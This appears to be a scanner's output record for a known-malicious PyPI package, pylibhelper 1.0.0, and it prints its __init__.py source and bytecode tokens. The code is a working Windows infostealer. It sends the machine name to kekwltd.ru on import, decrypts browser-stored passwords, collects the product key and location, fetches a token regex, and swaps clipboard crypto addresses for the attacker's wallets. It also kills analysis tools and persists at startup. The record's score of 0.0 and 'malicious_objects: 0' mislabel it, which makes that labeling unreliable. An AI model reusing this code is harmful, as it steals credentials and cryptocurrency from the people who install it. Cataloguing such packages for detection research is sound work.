statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pylibhelper/1.0.0/pylibhelper-1.0.0-py3-none-any/pylibhelper/__init__.py
  contents:
  - name: <module>
    score: 0.0
    code: "import requests\nimport os\nimport httpx\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n            \n    }\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\n\n\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\n\nPassw = [];\n\n# `\n#    \"yourwebhookurl\" = your discord webhook url\n#    \"hide\" = you want to hide grabber? ('yes' or 'no')\n#    \"dbugkiller\" = recommand to let this\n#    \"blprggg\" = don't touch at this\n#\n# `\n\nkekwltd = \"Powered by KEKWLTD.RU\"\n\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    \n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n\n}\n\n\n\n\ninfocom = os.getlogin()\nvctm_pc = os.getenv(\"COMPUTERNAME\")\nr4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(\".\")[0]\nd1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]\n\nKEKWLTD_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'\nreg_req = requests.get(KEKWLTD_Regex) \nclear_reg = r\"[\\w-]{24}\\.\" + reg_req.text\n\n\n\n\nclass Functions(object):\n\n    @staticmethod\n    def gtmk3y(path: str or os.PathLike):\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            return Functions.w1nd0_dcr(master_key[5:])\n        except KeyError:\n            return None\n\n    @staticmethod\n    def cnverttim(time: int or float) -> str:\n        try:\n            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)\n            codestamp = epoch + timedelta(microseconds=time)\n            return codestamp\n        except Exception:\n            pass\n\n    @staticmethod\n    def w1nd0_dcr(encrypted_str: bytes) -> str:\n        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]\n\n    @staticmethod\n    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):\n        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\n        path = ntpath.join(_dir, f1lenom)\n        open(path, \"x\")\n        return path\n\n    @staticmethod\n    def dcrpt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\"'\n\n    @staticmethod\n    def g3t_H(token: str = None):\n        headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n\n    @staticmethod\n    def sys_1fo() -> list:\n        flag = 0x08000000\n        sh1 = \"wmic csproduct get uuid\"\n        sh2 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        sh3 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\"\n        try:\n            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\\n')[1].strip()\n        except Exception:\n            uuidwndz = \"N/A\"\n        try:\n            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nk33y = \"N/A\"\n        try:\n            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nv3r = \"N/A\"\n        return [uuidwndz, w1nv3r, w1nk33y]\n\n\n    @staticmethod\n    def net_1fo() -> list:\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\n        req = httpx.get(\"https://ipinfo.io/json\")\n        if req.status_code == 200:\n            data = req.json()\n            ip = data.get('ip')\n            city = data.get('city')\n            country = data.get('country')\n            region = data.get('region')\n            org = data.get('org')\n            loc = data.get('loc')\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\n        return [ip, city, country, region, org, loc, googlemap]\n\n    @staticmethod\n    def fetch_conf(e: str) -> str or bool | None:\n        return __config__.get(e)"
    tokens: 'TARGETED_FILE resume load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name httpx store_name httpx load_const embeds load_const STRING_LEN_S_ENT_HIGH load_const PC Username = push_null load_name os load_attr getenv load_const COMPUTERNAME call binary_op + load_const build_const_key_map build_list build_map store_name data push_null load_name httpx load_attr post load_const STRING_URL load_name data kw_names json call pop_top push_null load_name os load_attr system load_const STRING_LEN_M_ENT_HIGH call pop_top load_const INTEGER load_const import_name asyncio store_name asyncio load_const INTEGER load_const import_name json store_name json load_const INTEGER load_const import_name ntpath store_name ntpath load_const INTEGER load_const import_name random store_name random load_const INTEGER load_const import_name re store_name re load_const INTEGER load_const import_name shutil store_name shutil load_const INTEGER load_const import_name sqlite3 store_name sqlite3 load_const INTEGER load_const import_name subprocess store_name subprocess load_const INTEGER load_const import_name threading store_name threading load_const INTEGER load_const import_name winreg store_name winreg load_const INTEGER load_const import_name zipfile store_name zipfile load_const INTEGER load_const import_name httpx store_name httpx load_const INTEGER load_const import_name psutil store_name psutil load_const INTEGER load_const import_name base64 store_name base64 load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name ctypes store_name ctypes load_const INTEGER load_const import_name time store_name time load_const INTEGER load_const import_name pyperclip store_name pyperclip load_const INTEGER load_const import_name sqlite3 import_from connect store_name connect pop_top load_const INTEGER load_const import_name base64 import_from ENCODING_DECODING store_name ENCODING_DECODING pop_top load_const INTEGER load_const import_name urllib.request import_from Request store_name Request import_from NETWORK_HTTP_REQUEST store_name NETWORK_HTTP_REQUEST pop_top load_const INTEGER load_const import_name shutil import_from copy2 store_name copy2 pop_top load_const INTEGER load_const import_name datetime import_from datetime store_name datetime import_from timedelta store_name timedelta import_from timezone store_name timezone pop_top load_const INTEGER load_const import_name sys import_from argv store_name argv pop_top load_const INTEGER load_const import_name tempfile import_from gettempdir store_name gettempdir import_from mkdtemp store_name mkdtemp pop_top load_const INTEGER load_const import_name json import_from loads store_name loads import_from dumps store_name dumps pop_top load_const INTEGER load_const import_name ctypes import_from windll store_name windll import_from wintypes store_name wintypes import_from byref store_name byref import_from cdll store_name cdll import_from Structure store_name Structure import_from POINTER store_name POINTER import_from c_char store_name c_char import_from c_buffer store_name c_buffer pop_top load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_name AES pop_top load_const INTEGER load_const import_name PIL import_from ImageGrab store_name ImageGrab pop_top load_const INTEGER load_const import_name win32crypt import_from STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH pop_top push_null load_name os load_attr getenv load_const LOCALAPPDATA call store_name local push_null load_name os load_attr getenv load_const APPDATA call store_name roaming push_null load_name os load_attr getenv load_const TEMP call store_name temp build_list store_global Passw load_const STRING_LEN_S_ENT_HIGH store_name kekwltd build_map load_const yourwebhookurl load_const STRING_URL map_add load_const hide load_const yes map_add load_const ping load_const yes map_add load_const pingtype load_const everyone map_add load_const fake_error load_const no map_add load_const startup load_const yes map_add load_const STRING_LEN_S_ENT_HIGH load_const INTEGER map_add load_const dbugkiller load_const INTEGER map_add load_const STRING_LEN_S_ENT_HIGH load_const yes map_add load_const addresse_btc load_const STRING_LEN_S_ENT_HIGH map_add load_const addresse_eth load_const STRING_LEN_S_ENT_HIGH map_add load_const addresse_xchain load_const none map_add load_const addresse_pchain load_const none map_add load_const addresse_cchain load_const none map_add load_const addresse_monero load_const STRING_LEN_S_ENT_HIGH map_add load_const addresse_ada load_const STRING_LEN_M_ENT_HIGH map_add load_const addresse_dash load_const STRING_LEN_S_ENT_HIGH map_add load_const blprggg build_list load_const list_extend build_map dict_update store_name __config__ push_null load_name os load_attr SYSINFO_USER call store_name infocom push_null load_name os load_attr getenv load_const COMPUTERNAME call store_name vctm_pc push_null load_name str push_null load_name psutil load_attr virtual_memory call load_const INTEGER binary_subscr load_const INTEGER binary_op / call load_attr split load_const . call load_const INTEGER binary_subscr store_name r4m push_null load_name str push_null load_name psutil load_attr disk_usage load_const / call load_const INTEGER binary_subscr load_const INTEGER binary_op / call load_attr split load_const . call load_const INTEGER binary_subscr store_name d1sk load_const STRING_URL store_name KEKWLTD_Regex push_null load_name requests load_attr get load_name KEKWLTD_Regex call store_name reg_req load_const STRING_FILE_PATH load_name reg_req load_attr text binary_op + store_name clear_reg push_null load_build_class load_const OBJECT make_function load_const Functions load_name object call store_name Functions push_null load_build_class load_const OBJECT make_function load_const STRING_LEN_S_ENT_HIGH load_name Functions call store_name STRING_LEN_S_ENT_HIGH push_null load_build_class load_const OBJECT make_function load_const bc_initial_func load_name Functions call store_name bc_initial_func push_null load_build_class load_const OBJECT make_function load_const NoDebugg load_name Functions call store_name NoDebugg load_name __name__ load_const __main__ compare_op == pop_jump_if_false TO_NUMBER load_name os load_attr name load_const nt compare_op == pop_jump_if_false TO_NUMBER push_null load_name asyncio load_attr run push_null load_name bc_initial_func call load_attr init call call pop_top push_null load_name os load_attr getenv load_const LOCALAPPDATA call store_name local push_null load_name os load_attr getenv load_const APPDATA call store_name roaming push_null load_name os load_attr getenv load_const TEMP call store_name temp build_list store_name Threadlist load_const e load_name str load_const return load_name str copy pop_jump_if_true TO_NUMBER pop_top load_name bool load_const binary_op | build_tuple load_const OBJECT make_function annotations store_name fetch_conf push_null load_name fetch_conf load_const yourwebhookurl call store_name hook push_null load_build_class load_const OBJECT make_function load_const DATA_BLOB load_name Structure call store_name DATA_BLOB load_const OBJECT make_function store_name GetData load_const load_const OBJECT make_function defaults store_name STRING_LEN_S_ENT_HIGH load_const load_const OBJECT make_function defaults store_name DecryptValue load_const load_const OBJECT make_function defaults store_name LoadRequests load_const load_const OBJECT make_function defaults store_name LoadUrlib load_const OBJECT make_function store_name Trust load_const OBJECT make_function store_name Reformat load_const load_const OBJECT make_function defaults store_name upload load_const OBJECT make_function store_name writeforfile build_list store_global Passw load_const OBJECT make_function store_name getPassw build_list store_global Cookies load_const OBJECT make_function store_name getCookie load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH load_const OBJECT make_function store_name ZipThings load_const OBJECT make_function store_name grabb_GatherAll load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH build_list store_global bc_create_files load_const OBJECT make_function store_name bc_create_file load_const OBJECT make_function store_name bc_checking build_list load_const list_extend store_global keyword build_list store_global cookiWords build_list store_global paswWords push_null load_name grabb_GatherAll call pop_top push_null load_name Trust load_global Cookies call store_global DETECTED load_global DETECTED pop_jump_if_true TO_NUMBER push_null load_name bc_checking call store_name wikith load_name wikith get_iter for_iter TO_NUMBER store_name thread load_name thread load_attr join call pop_top jump_backward TO_NUMBER end_for push_null load_name time load_attr sleep load_const FLOAT call pop_top load_const ```diff store_name filetext load_global bc_create_files get_iter for_iter TO_NUMBER store_name arg push_null load_name len load_name arg load_const INTEGER binary_subscr call load_const INTEGER compare_op != pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_name arg load_const INTEGER binary_subscr store_name foldpath load_name arg load_const INTEGER binary_subscr store_name foldlist load_name filetext load_const binary_op += store_name filetext load_name filetext load_const - load_name foldpath format_value INTEGER load_const build_string binary_op += store_name filetext load_name foldlist get_iter for_iter TO_NUMBER store_name ffil load_name ffil load_const INTEGER binary_subscr load_attr split load_const / call store_name a load_name a push_null load_name len load_name a call load_const INTEGER binary_op - binary_subscr store_name fileanme load_name ffil load_const INTEGER binary_subscr store_name b load_name filetext load_const + Name: load_name fileanme format_value INTEGER load_const + Link: load_name b format_value INTEGER build_string binary_op += store_name filetext load_name filetext load_const binary_op += store_name filetext jump_backward TO_NUMBER end_for jump_backward TO_NUMBER end_for load_name filetext load_const ``` binary_op += store_name filetext push_null load_name upload load_const bc_checking load_name filetext call pop_top push_null load_name threading load_attr Thread push_null load_name STRING_LEN_S_ENT_HIGH call load_attr run kw_names target call store_name auto load_name auto load_attr start call pop_top return_const None return_const None'
    hash: 6fe9a96e89e82994f033eed172a894900ebbbc572fdd90f2532adc27f9b39f6b
sources:
  .repo_cache/malicious_repos/pypi_malregistry/pylibhelper/1.0.0/pylibhelper-1.0.0-py3-none-any/pylibhelper/__init__.py: 
